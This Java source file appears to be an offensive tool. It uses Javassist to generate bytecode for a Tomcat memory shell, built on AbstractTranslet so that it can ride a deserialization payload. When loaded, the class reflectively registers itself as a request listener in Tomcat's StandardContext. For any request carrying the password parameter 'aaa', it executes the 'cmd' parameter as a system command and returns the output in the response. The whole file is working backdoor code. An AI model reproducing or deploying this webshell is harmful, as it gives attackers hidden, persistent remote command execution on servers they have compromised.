package org.memshell;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class TomcatListenerCMD {
    public static byte[] generateListenerMemShell() throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass listenerClass = pool.get("javax.servlet.ServletRequestListener");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{listenerClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建requestDestroyed方法
        CtMethod requestDestroyed = CtNewMethod.make("public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {}", ctClass);
        ctClass.addMethod(requestDestroyed);

        // 创建requestInitialized方法
        CtMethod requestInitialized = CtNewMethod.make("public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                "        try {\n" +
                "            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();\n" +
                "            java.lang.reflect.Field requestField = requestFacade.getClass().getDeclaredField(\"request\");\n" +
                "            requestField.setAccessible(true);\n" +
                "            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(requestFacade);\n" +
                "            org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "            String pass = request.getParameter(\"pass\");\n" +
                "            if(pass != null && !pass.isEmpty() && request.getParameter(\"pass\").equals(\"aaa\")){\n" +
                "                String cmd = request.getParameter(\"cmd\");\n" +
                "                if (cmd != null && !cmd.isEmpty()){\n" +
                "                    java.lang.Process exec = Runtime.getRuntime().exec(cmd);\n" +
                "                    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(exec.getInputStream()));\n" +
                "                    java.lang.StringBuilder output = new java.lang.StringBuilder();\n" +
                "                    String line;\n" +
                "                    while ((line = reader.readLine()) != null) {\n" +
                "                        output.append(line).append(\"\\n\");\n" +
                "                    }\n" +
                "                    int exitCode = exec.waitFor();\n" +
                "                    response.getWriter().write(output.toString());\n" +
                "                }\n" +
                "            }\n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(requestInitialized);

        // 创建静态方法块
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "            org.apache.catalina.core.ApplicationContextFacade facade =\n" +
                "                    (org.apache.catalina.core.ApplicationContextFacade) ((org.apache.catalina.loader.WebappClassLoaderBase)Thread.currentThread()\n" +
                "                            .getContextClassLoader()).getResources().getContext().getServletContext();\n" +
                "            java.lang.reflect.Field contextField = org.apache.catalina.core.ApplicationContextFacade.class.getDeclaredField(\"context\");\n" +
                "            contextField.setAccessible(true);\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(facade);\n" +
                "            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
                "            standardContextField.setAccessible(true);\n" +
                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) standardContextField.get(applicationContext);\n" +
                "            " + className + " " + className.toLowerCase() + " = new " + className + "();" +
                "            String listenerShellClassName = " + className.toLowerCase() + ".getClass().getName();" +
                "            standardContext.addApplicationListener(listenerShellClassName);" +
                "            java.util.List eventListeners = new java.util.ArrayList();" +
                "            eventListeners.add(" + className.toLowerCase() + ");" +
                "            Object[] applicationEventListeners = standardContext.getApplicationEventListeners();" +
                "            eventListeners.addAll(java.util.Arrays.asList(applicationEventListeners));" +
                "            standardContext.setApplicationEventListeners(eventListeners.toArray());" +
                "        } catch (Exception e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");
        return ctClass.toBytecode();
    }
}
